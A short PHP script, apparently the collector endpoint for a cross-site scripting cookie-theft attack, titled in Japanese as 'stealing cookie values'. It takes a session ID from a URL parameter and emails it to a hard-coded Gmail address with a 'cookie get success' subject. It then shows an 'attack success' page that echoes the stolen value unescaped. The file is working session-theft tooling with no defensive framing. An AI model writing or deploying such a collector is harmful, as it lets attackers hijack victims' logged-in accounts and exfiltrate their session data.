<?php
/**
 *
 * クッキー値の盗み出し
 *
 * Created by IntelliJ IDEA.
 * User: xsmiledur
 * Date: 2017/06/12
 * Time: 15:48
 */

$sid = $_GET['sid'];


/* クッキー値取得メール通知 */
$to      = 'xsmiledur.8x7@gmail.com';
$subject = 'Cookieゲット 成功';
$message = "cookieゲット\n ".$sid;
$headers = 'From: xsmiledur.8x7@gmail.com' . "\r\n";
$res = mb_send_mail($to, $subject, $message, $headers);

?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>クッキー値の盗み出し</title>
    <meta name="viewport" content="width=device-width">
    <link rel="stylesheet" href="style.css">
</head>
<body>
攻撃成功！<br>
Cookieは<br><?php echo $sid; ?>

</body>
